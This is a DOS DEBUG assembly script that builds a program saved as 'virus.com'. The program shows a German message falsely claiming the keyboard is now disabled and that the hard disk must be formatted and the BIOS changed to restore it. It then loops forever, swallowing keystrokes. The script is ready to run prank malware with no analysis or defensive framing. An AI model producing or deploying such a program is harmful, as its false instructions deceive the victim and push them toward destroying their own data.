A 100
mov ax,0900
mov dx,0114
int 21
mov ax,0700
int 21
jmp 0108
mov ax,4C00
int 21
db "Du meinst, du brauchst deine Tastatur nicht?",0a,0d
db "Na, gut! Dann wird ab jetzt kein Tastendruck mehr akzeptiert.",0a,0d
db "Um deine Tastatur wieder einzurichten, musst du die Festplatte",0a,0d
db "formatieren, und im BIOS die notwendigen Žnderungen vornehmen.",0a,0d
db "Viel Spass dabei!",0a,0d,0a,0d,"C:\>$"

R CX
11B
N virus.com
W
Q
